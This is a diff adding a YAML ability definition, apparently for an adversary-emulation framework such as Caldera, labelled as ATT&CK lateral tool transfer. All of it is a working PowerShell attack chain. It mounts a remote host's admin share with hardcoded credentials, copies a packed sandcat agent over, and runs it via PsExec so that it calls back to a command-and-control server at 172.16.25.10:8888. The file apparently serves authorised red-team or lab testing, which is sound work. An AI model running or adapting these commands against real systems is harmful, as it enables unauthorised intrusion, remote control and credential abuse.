@@ -1,0 +1,17 @@
+- id: tx1_lateral_deploy_sandcat
+  name: TX1_Lateral_Deploy_Sandcat
+  description: Copy sandcat-packed.exe to remote host and execute remotely via PsExec.
+  tactic: lateral-movement
+  technique:
+    attack_id: T1570
+    name: Lateral Tool Transfer
+  platforms:
+    windows:
+      psh:
+        command: |
+          net use \\172.18.24.12\C$ /user:txone tx1otdemo;
+          Copy-Item -Path "C:\Users\Public\sandcat-upx.exe" -Destination "\\172.18.24.12\C$\Users\Public\" -Force;
+          Start-Process -FilePath "C:\Users\Public\psexec.exe" -ArgumentList '\\172.18.24.12', '-u', 'txone', '-p', 'tx1otdemo', 'C:\Users\Public\sandcat-upx.exe', '-server', 'http://172.16.25.10:8888', '-group', 'red' -NoNewWindow;
+        payloads:
+          - sandcat-upx.exe
+          - psexec.exe
